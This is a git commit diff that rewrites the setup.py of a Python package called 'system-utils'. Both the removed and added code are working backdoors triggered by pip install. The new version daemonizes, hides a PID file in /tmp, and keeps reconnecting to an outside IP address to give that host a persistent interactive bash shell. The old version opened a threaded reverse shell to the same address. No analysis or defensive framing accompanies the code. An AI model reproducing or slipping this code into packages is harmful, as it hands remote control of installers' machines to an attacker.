9d8fa78cb57b3d648f8e522945acd95cc322149a
TalhaKhan <55598560+TalhaKhan-404@users.noreply.github.com>
2026-02-17 16:42:53 +0530

    Update setup.py

--- setup.py
+++ setup.py
@@ -3,77 +3,95 @@ import os
 import sys
 import socket
 import subprocess
-import threading
 import time
 import pty
+import fcntl
 
-def get_proper_shell(s):
-    """Get a fully functional shell automatically"""
+def create_pid_file():
+    """Ensure only one backdoor instance runs"""
+    pid_file = '/tmp/.system_utils.pid'
     
     try:
-        # Change to safe directory
-        os.chdir('/home/talhakhan' if os.path.exists('/home/talhakhan') else '/tmp')
+        # Check if already running
+        if os.path.exists(pid_file):
+            with open(pid_file, 'r') as f:
+                old_pid = f.read().strip()
+                try:
+                    # Check if process exists
+                    os.kill(int(old_pid), 0)
+                    # Process exists, don't start another
+                    return False
+                except:
+                    # Process doesn't exist, remove stale pid file
+                    os.remove(pid_file)
         
-        # Set environment variables
-        os.environ['TERM'] = 'xterm-256color'
-        os.environ['SHELL'] = '/bin/bash'
-        os.environ['PS1'] = '\\[\\e[1;32m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[1;34m\\]\\w\\[\\e[0m\\]\\$ '
+        # Write our PID
+        with open(pid_file, 'w') as f:
+            f.write(str(os.getpid()))
+            fcntl.flock(f.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
         
-        # Duplicate socket
-        for fd in (0, 1, 2):
-            try:
-                os.dup2(s.fileno(), fd)
-            except:
-                pass
-        
-        # Spawn PTY shell
-        pty.spawn(["/bin/bash", "--login"])
-        
+        return True
     except:
-        try:
-            subprocess.call(["/bin/bash", "-i"])
-        except:
-            pass
+        return False
 
-def enhanced_backdoor():
+def daemonize():
+    """Proper daemonization"""
     try:
-        # Daemonize
-        if os.fork() > 0: return
+        # First fork
+        if os.fork() > 0:
+            return True
+        
         os.setsid()
-        if os.fork() > 0: sys.exit(0)
+        os.chdir('/')
+        os.umask(0)
         
-        time.sleep(5)
+        # Second fork
+        if os.fork() > 0:
+            sys.exit(0)
         
-        while True:
-            try:
-                s = socket.socket()
-                s.connect(("142.93.23.15", 80))
-                
-                # ASCII-ONLY banner - no special characters!
-                s.send(b"\n")
-                s.send(b"+------------------------------------------+\n")
-                s.send(b"|     ENHANCED BACKDOOR - AUTO FIX         |\n")
-                s.send(b"+------------------------------------------+\n")
-                s.send(b"| Full TTY with job control                |\n")
-                s.send(b"| Proper directory navigation              |\n")
-                s.send(b"| Command history and editing              |\n")
-                s.send(b"| Tab completion enabled                   |\n")
-                s.send(b"| Colored prompt                           |\n")
-                s.send(b"+------------------------------------------+\n")
-                s.send(b"\n[+] Applying automatic fixes...\n")
-                s.send(b"[+] Shell ready!\n")
-                s.send(b"\n$ ")
-                
-                # Get proper shell
-                get_proper_shell(s)
-                
-            except Exception as e:
-                time.sleep(30)
+        # Create PID file
+        if not create_pid_file():
+            sys.exit(0)
+        
+        return False
     except:
-        pass
+        return True
 
-# Start backdoor
-threading.Thread(target=enhanced_backdoor, daemon=True).start()
+def persistent_backdoor():
+    ATTACKER_IP = "142.93.23.15"
+    ATTACKER_PORT = 80
+    
+    while True:
+        try:
+            s = socket.socket()
+            s.connect((ATTACKER_IP, ATTACKER_PORT))
+            
+            s.send(b"""
++------------------------------------------+
+|     PERSISTENT BACKDOOR - ALIVE          |
++------------------------------------------+
+| This process survives pip install        |
+| Will reconnect automatically             |
+| Check /tmp/.system_utils.pid for PID     |
++------------------------------------------+
 
-# Clean install
-setup(name="system-utils", version="1.0.0")
+$ """.encode())
+            
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
+            
+            pty.spawn(["/bin/bash", "--login"])
+            
+        except:
+            time.sleep(30)
+            continue
+
+# Main execution
+if daemonize():
+    # Parent - just run setup
+    setup(name="system-utils", version="1.0.0")
+else:
+    # Daemon - run backdoor
+    time.sleep(5)
+    persistent_backdoor()
